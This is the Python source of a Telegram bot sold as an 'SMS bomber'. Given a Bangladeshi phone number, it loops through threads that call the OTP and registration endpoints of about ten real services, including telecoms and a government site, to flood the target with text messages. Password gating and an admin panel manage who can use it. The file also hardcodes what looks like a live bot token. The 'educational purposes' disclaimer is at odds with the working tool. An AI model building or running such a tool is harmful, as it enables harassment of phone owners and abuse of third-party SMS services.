import os
import time
import threading
import requests
import json
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Bot Configuration
BOT_TOKEN = "8531656172:AAE-PQtP850ptO5QKVUcyy89OEtA6GNf_yw"
PASSWORD = "RLSMS"
AUTH_FILE = "authenticated_users.json"
BANNED_FILE = "banned_users.json"
ADMIN_FILE = "admin_users.json"
# Add your Telegram user ID here (get it from @userinfobot)
ADMIN_IDS = [7127437250]  # Example: [123456789, 987654321]

# Store user states and bombing threads
user_states = {}
bombing_threads = {}
counter = {}
counter_lock = threading.Lock()

def load_authenticated_users():
    """Load authenticated users from file"""
    try:
        if os.path.exists(AUTH_FILE):
            with open(AUTH_FILE, 'r') as f:
                data = json.load(f)
                return set(data.get('users', []))
    except Exception as e:
        print(f"Error loading authenticated users: {e}")
    return set()

def save_authenticated_users(user_id):
    """Save authenticated user to file"""
    try:
        authenticated_users = load_authenticated_users()
        authenticated_users.add(user_id)
        
        with open(AUTH_FILE, 'w') as f:
            json.dump({'users': list(authenticated_users)}, f)
    except Exception as e:
        print(f"Error saving authenticated user: {e}")

def load_banned_users():
    """Load banned users from file"""
    try:
        if os.path.exists(BANNED_FILE):
            with open(BANNED_FILE, 'r') as f:
                data = json.load(f)
                # Convert to int set for consistency
                return set(int(uid) for uid in data.get('users', []))
    except Exception as e:
        print(f"Error loading banned users: {e}")
    return set()

def save_banned_users(banned_users):
    """Save banned users to file"""
    try:
        with open(BANNED_FILE, 'w') as f:
            json.dump({'users': list(banned_users)}, f)
    except Exception as e:
        print(f"Error saving banned users: {e}")

def load_admin_users():
    """Load admin users from file"""
    try:
        if os.path.exists(ADMIN_FILE):
            with open(ADMIN_FILE, 'r') as f:
                data = json.load(f)
                # Convert to int set for consistency
                admin_list = [int(uid) for uid in data.get('users', [])]
                # Merge with hardcoded admin IDs
                return set(ADMIN_IDS + admin_list)
    except Exception as e:
        print(f"Error loading admin users: {e}")
    return set(ADMIN_IDS)

def save_admin_users(admin_users):
    """Save admin users to file"""
    try:
        # Remove hardcoded admins from list before saving (they're always included)
        file_admins = [uid for uid in admin_users if uid not in ADMIN_IDS]
        with open(ADMIN_FILE, 'w') as f:
            json.dump({'users': file_admins}, f)
    except Exception as e:
        print(f"Error saving admin users: {e}")

def is_admin(user_id):
    """Check if user is admin"""
    admin_users = load_admin_users()
    return user_id in admin_users

def get_admin_keyboard():
    """Create admin keyboard markup"""
    keyboard = [
        [KeyboardButton("👥 Admin Users"), KeyboardButton("📊 Admin Stats")],
        [KeyboardButton("📢 Broadcast"), KeyboardButton("🚫 Ban User")],
        [KeyboardButton("✅ Unban User"), KeyboardButton("👑 Add Admin")],
        [KeyboardButton("❌ Remove Admin"), KeyboardButton("🗑️ Clear Data")],
        [KeyboardButton("🏠 Main Menu")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

def get_keyboard():
    """Create reply keyboard markup"""
    keyboard = [
        [KeyboardButton("💣 /bomb"), KeyboardButton("📊 /status")],
        [KeyboardButton("🛑 /stop"), KeyboardButton("📈 Statistics")],
        [KeyboardButton("🏁 /start")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)

def update_counter(user_id):
    global counter
    with counter_lock:
        if user_id not in counter:
            counter[user_id] = 0
        counter[user_id] += 1

def fast_apis(phone, full, user_id):
    try:
        requests.get(f"https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn={full}&lang=en&ng=0", timeout=5)
        update_counter(user_id)
    except: pass

    try:
        requests.get(f"https://fundesh.com.bd/api/auth/generateOTP?service_key=&phone={phone}", timeout=5)
        update_counter(user_id)
    except: pass

def normal_apis(phone, full, user_id):
    apis = [
        ("https://webloginda.grameenphone.com/backend/api/v1/otp", {"msisdn": full}),
        ("https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php", {"phone": phone}),
        ("https://api.osudpotro.com/api/v1/users/send_otp", {"phone": phone}),
        ("https://api.apex4u.com/api/auth/login", {"phone": phone}),
        ("https://bb-api.bohubrihi.com/public/activity/otp", {"phone": phone}),
        ("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {"mobile": phone}),
        ("https://training.gov.bd/backoffice/api/user/sendOtp", {"phone": phone}),
        ("https://da-api.robi.com.bd/da-nll/otp/send", {"msisdn": full}),
    ]

    for url, data in apis:
        try:
            requests.post(url, json=data, timeout=5)
            update_counter(user_id)
        except: pass

def start_bombing(phone, full, user_id, context: ContextTypes.DEFAULT_TYPE):
    """Start SMS bombing in a separate thread"""
    if user_id in bombing_threads and bombing_threads[user_id].is_alive():
        return False
    
    def bombing_loop():
        while user_id in bombing_threads and bombing_threads[user_id].is_alive():
            threads = []

            for _ in range(3):
                t = threading.Thread(target=fast_apis, args=(phone, full, user_id))
                t.start()
                threads.append(t)

            t = threading.Thread(target=normal_apis, args=(phone, full, user_id))
            t.start()
            threads.append(t)

            for t in threads:
                t.join()
            
            # Send periodic updates
            if user_id in counter:
                try:
                    context.bot.send_message(
                        chat_id=user_id,
                        text=f"📱 SMS Sent: {counter[user_id]}"
                    )
                except: pass
            
            time.sleep(1)
    
    thread = threading.Thread(target=bombing_loop)
    thread.daemon = True
    bombing_threads[user_id] = thread
    counter[user_id] = 0
    thread.start()
    return True

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /start command"""
    user_id = update.effective_user.id
    
    # Check if user is banned
    banned_users = load_banned_users()
    if user_id in banned_users:
        await update.message.reply_text("❌ You are banned from using this bot!")
        return
    
    # Check if user is admin
    if is_admin(user_id):
        admin_text = """
🔐 Admin Panel

Welcome, Admin!

Use /admin to access admin panel
"""
        await update.message.reply_text(admin_text, reply_markup=get_admin_keyboard())
        return
    
    # Check if user is already authenticated (in memory or file)
    authenticated_users = load_authenticated_users()
    if user_id in authenticated_users:
        user_states[user_id] = "authenticated"
    
    if user_states.get(user_id) == "authenticated":
        welcome_text = """
╔═══════════════════════════════════╗
║   RAKIB VAI SMS BOMBER v2.0       ║
║        Telegram Bot Version       ║
╚═══════════════════════════════════╝

✅ Welcome back!

Commands:
/start - Start the bot
/bomb <number> - Start SMS bombing
/stop - Stop bombing
/status - Check status

Admin connect : @Hideman_u

⚠️ For educational purposes only
"""
        await update.message.reply_text(welcome_text, reply_markup=get_keyboard())
        return
    
    # First time user - ask for password
    banner_text = """
╔═══════════════════════════════════╗
║   RAKIB VAI SMS BOMBER v2.0       ║
║        Telegram Bot Version       ║
╚═══════════════════════════════════╝

🔐 This bot is password protected.

Please enter the password to continue:

Admin connect : @Hideman_u
"""
    await update.message.reply_text(banner_text)
    user_states[user_id] = "waiting_password"

async def bomb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /bomb command"""
    user_id = update.effective_user.id
    
    # Check authentication from file if not in memory
    authenticated_users = load_authenticated_users()
    if user_id in authenticated_users and user_states.get(user_id) != "authenticated":
        user_states[user_id] = "authenticated"
    
    if user_states.get(user_id) != "authenticated":
        await update.message.reply_text("❌ Please enter password first using /start", reply_markup=get_keyboard())
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /bomb <number>\nExample: /bomb 01712345678", reply_markup=get_keyboard())
        return
    
    number = context.args[0]
    
    # Validate number format
    if number.startswith("01") and len(number) == 11:
        phone = number
        full = "880" + number[1:]
    elif number.startswith("880") and len(number) == 13:
        phone = "0" + number[3:]
        full = number
    else:
        await update.message.reply_text("❌ Invalid number format. Use: 01XXXXXXXXX", reply_markup=get_keyboard())
        return
    
    # Check if already bombing
    if user_id in bombing_threads and bombing_threads[user_id].is_alive():
        await update.message.reply_text("⚠️ Bombing already in progress! Use /stop to stop first.", reply_markup=get_keyboard())
        return
    
    # Start bombing
    if start_bombing(phone, full, user_id, context):
        await update.message.reply_text(
            f"🚀 SMS Bombing Started!\n\n"
            f"📱 Target: {phone}\n"
            f"⏳ Status: Running...\n\n"
            f"Use /stop to stop bombing\n"
            f"Use /status to check progress",
            reply_markup=get_keyboard()
        )
    else:
        await update.message.reply_text("❌ Failed to start bombing!", reply_markup=get_keyboard())

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command"""
    user_id = update.effective_user.id
    
    # Check authentication from file if not in memory
    authenticated_users = load_authenticated_users()
    if user_id in authenticated_users and user_states.get(user_id) != "authenticated":
        user_states[user_id] = "authenticated"
    
    if user_states.get(user_id) != "authenticated":
        await update.message.reply_text("❌ Please enter password first using /start", reply_markup=get_keyboard())
        return
    
    if user_id in bombing_threads:
        if bombing_threads[user_id].is_alive():
            del bombing_threads[user_id]
            total = counter.get(user_id, 0)
            await update.message.reply_text(
                f"🛑 Bombing Stopped!\n\n"
                f"📊 Total SMS Sent: {total}",
                reply_markup=get_keyboard()
            )
            if user_id in counter:
                del counter[user_id]
        else:
            await update.message.reply_text("ℹ️ No active bombing session.", reply_markup=get_keyboard())
    else:
        await update.message.reply_text("ℹ️ No active bombing session.", reply_markup=get_keyboard())

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command"""
    user_id = update.effective_user.id
    
    # Check authentication from file if not in memory
    authenticated_users = load_authenticated_users()
    if user_id in authenticated_users and user_states.get(user_id) != "authenticated":
        user_states[user_id] = "authenticated"
    
    if user_states.get(user_id) != "authenticated":
        await update.message.reply_text("❌ Please enter password first using /start", reply_markup=get_keyboard())
        return
    
    is_running = user_id in bombing_threads and bombing_threads[user_id].is_alive()
    total = counter.get(user_id, 0)
    
    status_text = f"📊 Status:\n\n"
    status_text += f"🔄 Running: {'Yes' if is_running else 'No'}\n"
    status_text += f"📱 Total SMS Sent: {total}"
    
    await update.message.reply_text(status_text, reply_markup=get_keyboard())

async def statistics_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Statistics command"""
    user_id = update.effective_user.id
    
    # Check authentication from file if not in memory
    authenticated_users = load_authenticated_users()
    if user_id in authenticated_users and user_states.get(user_id) != "authenticated":
        user_states[user_id] = "authenticated"
    
    if user_states.get(user_id) != "authenticated":
        await update.message.reply_text("❌ Please enter password first using /start", reply_markup=get_keyboard())
        return
    
    # Calculate overall statistics
    total_users = len(user_states)
    authenticated_users = sum(1 for state in user_states.values() if state == "authenticated")
    active_bombing = sum(1 for thread in bombing_threads.values() if thread.is_alive())
    total_sms_all = sum(counter.values()) if counter else 0
    user_sms = counter.get(user_id, 0)
    
    stats_text = f"""
📈 Statistics:

👥 Total Users: {total_users}
✅ Authenticated: {authenticated_users}
🚀 Active Bombing: {active_bombing}

📱 Your SMS Sent: {user_sms}
📊 Total SMS (All Users): {total_sms_all}

🔄 Your Status: {'Running' if (user_id in bombing_threads and bombing_threads[user_id].is_alive()) else 'Idle'}
"""
    
    await update.message.reply_text(stats_text, reply_markup=get_keyboard())

# Admin Commands
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /admin command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized to use this command!")
        return
    
    admin_text = """
🔐 Admin Panel

Commands:
/admin_users - View all users
/admin_stats - View detailed statistics
/admin_broadcast <message> - Broadcast message to all users
/admin_ban <user_id> - Ban a user
/admin_unban <user_id> - Unban a user
/admin_add <user_id> - Add admin
/admin_remove <user_id> - Remove admin
/admin_clear - Clear all data

Use buttons below or commands
"""
    await update.message.reply_text(admin_text, reply_markup=get_admin_keyboard())

async def admin_users_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin users view"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    authenticated_users = load_authenticated_users()
    banned_users = load_banned_users()
    admin_users = load_admin_users()
    
    users_text = f"""
👥 Users Information:

✅ Authenticated Users: {len(authenticated_users)}
🚫 Banned Users: {len(banned_users)}
👑 Admin Users: {len(admin_users)}
👤 Total Active Users: {len(user_states)}

📋 Authenticated User IDs:
{', '.join(map(str, list(authenticated_users)[:20]))}
{"..." if len(authenticated_users) > 20 else ""}

📋 Banned User IDs:
{', '.join(map(str, list(banned_users)[:20]))}
{"..." if len(banned_users) > 20 else ""}

👑 Admin User IDs:
{', '.join(map(str, list(admin_users)[:20]))}
{"..." if len(admin_users) > 20 else ""}
"""
    await update.message.reply_text(users_text, reply_markup=get_admin_keyboard())

async def admin_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin statistics"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    authenticated_users = load_authenticated_users()
    banned_users = load_banned_users()
    active_bombing = sum(1 for thread in bombing_threads.values() if thread.is_alive())
    total_sms_all = sum(counter.values()) if counter else 0
    
    stats_text = f"""
📊 Admin Statistics:

👥 Total Authenticated: {len(authenticated_users)}
🚫 Total Banned: {len(banned_users)}
🚀 Active Bombing Sessions: {active_bombing}
📱 Total SMS Sent (All Users): {total_sms_all}
💾 Active Sessions in Memory: {len(user_states)}

📈 Top Users by SMS:
"""
    
    # Get top 5 users by SMS count
    sorted_users = sorted(counter.items(), key=lambda x: x[1], reverse=True)[:5]
    for idx, (uid, count) in enumerate(sorted_users, 1):
        stats_text += f"{idx}. User {uid}: {count} SMS\n"
    
    await update.message.reply_text(stats_text, reply_markup=get_admin_keyboard())

async def admin_broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin broadcast"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /admin_broadcast <message>", reply_markup=get_admin_keyboard())
        return
    
    message = " ".join(context.args)
    authenticated_users = load_authenticated_users()
    
    sent = 0
    failed = 0
    
    for uid in authenticated_users:
        try:
            await context.bot.send_message(chat_id=int(uid), text=f"📢 Broadcast:\n\n{message}")
            sent += 1
        except:
            failed += 1
    
    await update.message.reply_text(
        f"✅ Broadcast completed!\n\n✅ Sent: {sent}\n❌ Failed: {failed}",
        reply_markup=get_admin_keyboard()
    )

async def admin_ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin ban user"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /admin_ban <user_id>", reply_markup=get_admin_keyboard())
        return
    
    try:
        ban_user_id = int(context.args[0])
        
        # Send message to user before banning
        try:
            ban_message = """
❌ You have been banned from using this bot!

If you think this is a mistake, please contact the admin:

👤 Admin: @Hideman_u

Thank you for understanding.
"""
            await context.bot.send_message(chat_id=ban_user_id, text=ban_message)
        except Exception as e:
            print(f"Could not send ban message to user {ban_user_id}: {e}")
        
        banned_users = load_banned_users()
        banned_users.add(int(ban_user_id))  # Ensure it's int
        save_banned_users(banned_users)
        
        # Remove from authenticated if exists
        authenticated_users = load_authenticated_users()
        if ban_user_id in authenticated_users:
            authenticated_users.remove(ban_user_id)
            with open(AUTH_FILE, 'w') as f:
                json.dump({'users': list(authenticated_users)}, f)
        
        # Stop bombing if active
        if ban_user_id in bombing_threads:
            del bombing_threads[ban_user_id]
        
        await update.message.reply_text(f"✅ User {ban_user_id} has been banned and notified!", reply_markup=get_admin_keyboard())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!", reply_markup=get_admin_keyboard())

async def admin_unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin unban user"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /admin_unban <user_id>\n\nExample: /admin_unban 123456789", reply_markup=get_admin_keyboard())
        return
    
    try:
        unban_user_id = int(context.args[0])
        banned_users = load_banned_users()
        
        # Check if user is banned (try both int and string)
        if unban_user_id in banned_users or str(unban_user_id) in [str(uid) for uid in banned_users]:
            # Remove from banned list
            banned_users = {uid for uid in banned_users if uid != unban_user_id and str(uid) != str(unban_user_id)}
            save_banned_users(banned_users)
            
            # Send unban message to user
            try:
                unban_message = """
✅ You have been unbanned!

You can now use the bot again. Use /start to begin.
"""
                await context.bot.send_message(chat_id=unban_user_id, text=unban_message)
            except Exception as e:
                print(f"Could not send unban message to user {unban_user_id}: {e}")
            
            await update.message.reply_text(f"✅ User {unban_user_id} has been unbanned and notified!", reply_markup=get_admin_keyboard())
        else:
            await update.message.reply_text(f"❌ User {unban_user_id} is not banned!", reply_markup=get_admin_keyboard())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Please provide a valid numeric user ID.", reply_markup=get_admin_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_admin_keyboard())

async def admin_clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin clear data"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    # Clear all data
    user_states.clear()
    bombing_threads.clear()
    counter.clear()
    
    # Clear files
    if os.path.exists(AUTH_FILE):
        with open(AUTH_FILE, 'w') as f:
            json.dump({'users': []}, f)
    
    await update.message.reply_text("✅ All data has been cleared!", reply_markup=get_admin_keyboard())

async def admin_add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin add command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /admin_add <user_id>\n\nExample: /admin_add 123456789", reply_markup=get_admin_keyboard())
        return
    
    try:
        new_admin_id = int(context.args[0])
        
        # Check if already admin
        admin_users = load_admin_users()
        if new_admin_id in admin_users:
            await update.message.reply_text(f"❌ User {new_admin_id} is already an admin!", reply_markup=get_admin_keyboard())
            return
        
        # Add to admin list
        admin_users.add(new_admin_id)
        save_admin_users(admin_users)
        
        # Send notification to new admin
        try:
            admin_message = """
👑 You have been promoted to Admin!

You now have access to the admin panel. Use /admin to access it.
"""
            await context.bot.send_message(chat_id=new_admin_id, text=admin_message)
        except Exception as e:
            print(f"Could not send admin message to user {new_admin_id}: {e}")
        
        await update.message.reply_text(f"✅ User {new_admin_id} has been added as admin and notified!", reply_markup=get_admin_keyboard())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Please provide a valid numeric user ID.", reply_markup=get_admin_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_admin_keyboard())

async def admin_remove_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle admin remove command"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("❌ You are not authorized!")
        return
    
    if not context.args:
        await update.message.reply_text("❌ Usage: /admin_remove <user_id>\n\nExample: /admin_remove 123456789", reply_markup=get_admin_keyboard())
        return
    
    try:
        remove_admin_id = int(context.args[0])
        
        # Check if trying to remove hardcoded admin
        if remove_admin_id in ADMIN_IDS:
            await update.message.reply_text(f"❌ Cannot remove hardcoded admin {remove_admin_id}!", reply_markup=get_admin_keyboard())
            return
        
        # Check if trying to remove yourself
        if remove_admin_id == user_id:
            await update.message.reply_text(f"❌ You cannot remove yourself as admin!", reply_markup=get_admin_keyboard())
            return
        
        admin_users = load_admin_users()
        if remove_admin_id in admin_users:
            admin_users.remove(remove_admin_id)
            save_admin_users(admin_users)
            
            # Send notification
            try:
                remove_message = """
❌ Your admin access has been removed.

You no longer have admin privileges.
"""
                await context.bot.send_message(chat_id=remove_admin_id, text=remove_message)
            except Exception as e:
                print(f"Could not send removal message to user {remove_admin_id}: {e}")
            
            await update.message.reply_text(f"✅ User {remove_admin_id} has been removed from admin!", reply_markup=get_admin_keyboard())
        else:
            await update.message.reply_text(f"❌ User {remove_admin_id} is not an admin!", reply_markup=get_admin_keyboard())
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID! Please provide a valid numeric user ID.", reply_markup=get_admin_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}", reply_markup=get_admin_keyboard())

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle regular messages"""
    user_id = update.effective_user.id
    
    # Check if user is admin and handle admin buttons
    if is_admin(user_id):
        text = update.message.text.strip()
        if "admin users" in text.lower() or "👥" in text:
            await admin_users_command(update, context)
            return
        elif "admin stats" in text.lower() or "📊" in text:
            await admin_stats_command(update, context)
            return
        elif "broadcast" in text.lower() or "📢" in text:
            await update.message.reply_text("❌ Usage: /admin_broadcast <message>", reply_markup=get_admin_keyboard())
            return
        elif "ban user" in text.lower() or "🚫" in text:
            # Show list of authenticated users
            authenticated_users = load_authenticated_users()
            if authenticated_users:
                users_list = "\n".join([f"• {uid}" for uid in list(authenticated_users)[:10]])
                if len(authenticated_users) > 10:
                    users_list += f"\n... and {len(authenticated_users) - 10} more"
                await update.message.reply_text(
                    f"👥 Authenticated Users:\n\n{users_list}\n\n"
                    f"To ban, use:\n/admin_ban <user_id>\n\n"
                    f"Example: /admin_ban 123456789",
                    reply_markup=get_admin_keyboard()
                )
            else:
                await update.message.reply_text("ℹ️ No authenticated users to ban!", reply_markup=get_admin_keyboard())
            return
        elif "unban user" in text.lower() or ("✅" in text and "unban" in text.lower()):
            # Show list of banned users
            banned_users = load_banned_users()
            if banned_users:
                banned_list = "\n".join([f"• {uid}" for uid in list(banned_users)[:10]])
                if len(banned_users) > 10:
                    banned_list += f"\n... and {len(banned_users) - 10} more"
                await update.message.reply_text(
                    f"🚫 Banned Users:\n\n{banned_list}\n\n"
                    f"To unban, use:\n/admin_unban <user_id>\n\n"
                    f"Example: /admin_unban 6393419765",
                    reply_markup=get_admin_keyboard()
                )
            else:
                await update.message.reply_text("✅ No banned users!", reply_markup=get_admin_keyboard())
            return
        elif "add admin" in text.lower() or "👑 add admin" in text.lower() or (text.strip() == "👑 Add Admin"):
            # Show list of authenticated users
            authenticated_users = load_authenticated_users()
            admin_users = load_admin_users()
            non_admin_users = authenticated_users - admin_users
            
            if non_admin_users:
                users_list = "\n".join([f"• {uid}" for uid in list(non_admin_users)[:10]])
                if len(non_admin_users) > 10:
                    users_list += f"\n... and {len(non_admin_users) - 10} more"
                await update.message.reply_text(
                    f"👥 Users (Not Admin):\n\n{users_list}\n\n"
                    f"To add admin, use:\n/admin_add <user_id>\n\n"
                    f"Example: /admin_add 123456789",
                    reply_markup=get_admin_keyboard()
                )
            else:
                await update.message.reply_text("ℹ️ All authenticated users are already admins!", reply_markup=get_admin_keyboard())
            return
        elif "remove admin" in text.lower() or "❌ remove admin" in text.lower() or (text.strip() == "❌ Remove Admin"):
            # Show list of admin users
            admin_users = load_admin_users()
            # Exclude hardcoded admins from removal list
            removable_admins = {uid for uid in admin_users if uid not in ADMIN_IDS}
            
            if removable_admins:
                admin_list = "\n".join([f"• {uid}" for uid in list(removable_admins)[:10]])
                if len(removable_admins) > 10:
                    admin_list += f"\n... and {len(removable_admins) - 10} more"
                await update.message.reply_text(
                    f"👑 Admin Users (Removable):\n\n{admin_list}\n\n"
                    f"To remove admin, use:\n/admin_remove <user_id>\n\n"
                    f"Example: /admin_remove 123456789",
                    reply_markup=get_admin_keyboard()
                )
            else:
                await update.message.reply_text("ℹ️ No removable admins! (Only hardcoded admins exist)", reply_markup=get_admin_keyboard())
            return
        elif "clear data" in text.lower() or "🗑️" in text:
            await admin_clear_command(update, context)
            return
        elif "main menu" in text.lower() or "🏠" in text:
            await update.message.reply_text("🏠 Main Menu", reply_markup=get_keyboard())
            return
    
    # Check if user is banned
    banned_users = load_banned_users()
    if user_id in banned_users:
        await update.message.reply_text("❌ You are banned from using this bot!")
        return
    
    if user_states.get(user_id) == "waiting_password":
        password = update.message.text.strip()
        if password == PASSWORD:
            user_states[user_id] = "authenticated"
            save_authenticated_users(user_id)  # Save to file
            welcome_text = """
✅ Access Granted!

Commands:
/start - Start the bot
/bomb <number> - Start SMS bombing
/stop - Stop bombing
/status - Check status

⚠️ For educational purposes only
"""
            await update.message.reply_text(welcome_text, reply_markup=get_keyboard())
        else:
            await update.message.reply_text("❌ Incorrect password! Please try again or use /start")
    else:
        # Check if user sent a button text that matches a command
        text = update.message.text.strip()
        if "/bomb" in text or text.lower() == "bomb" or "💣" in text:
            await update.message.reply_text("❌ Usage: /bomb <number>\nExample: /bomb 01712345678", reply_markup=get_keyboard())
        elif "/status" in text or text.lower() == "status" or "📊" in text:
            # Trigger status command
            await status_command(update, context)
        elif "/stop" in text or text.lower() == "stop" or "🛑" in text:
            # Trigger stop command
            await stop_command(update, context)
        elif "/start" in text or text.lower() == "start" or "🏁" in text:
            await start_command(update, context)
        elif "statistics" in text.lower() or "📈" in text:
            await statistics_command(update, context)
        else:
            await update.message.reply_text("ℹ️ Use /start to begin or select a button", reply_markup=get_keyboard())

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors"""
    print(f"Update {update} caused error {context.error}")

def main():
    """Start the bot"""
    print("🤖 Starting Telegram Bot...")
    print("📱 Bot Token:", BOT_TOKEN[:20] + "...")
    
    # Load authenticated users from file
    authenticated_users = load_authenticated_users()
    for user_id in authenticated_users:
        user_states[user_id] = "authenticated"
    print(f"✅ Loaded {len(authenticated_users)} authenticated users from file")
    
    # Load banned users
    banned_users = load_banned_users()
    print(f"🚫 Loaded {len(banned_users)} banned users from file")
    
    # Admin info
    if ADMIN_IDS:
        print(f"👑 Admin IDs: {ADMIN_IDS}")
    else:
        print("⚠️ WARNING: No admin IDs configured! Add your user ID to ADMIN_IDS in the code.")
    
    # Create application
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Add handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("bomb", bomb_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    # Admin handlers
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("admin_users", admin_users_command))
    application.add_handler(CommandHandler("admin_stats", admin_stats_command))
    application.add_handler(CommandHandler("admin_broadcast", admin_broadcast_command))
    application.add_handler(CommandHandler("admin_ban", admin_ban_command))
    application.add_handler(CommandHandler("admin_unban", admin_unban_command))
    application.add_handler(CommandHandler("admin_add", admin_add_command))
    application.add_handler(CommandHandler("admin_remove", admin_remove_command))
    application.add_handler(CommandHandler("admin_clear", admin_clear_command))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.add_error_handler(error_handler)
    
    # Start the bot
    print("✅ Bot is running! Press Ctrl+C to stop.")
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()

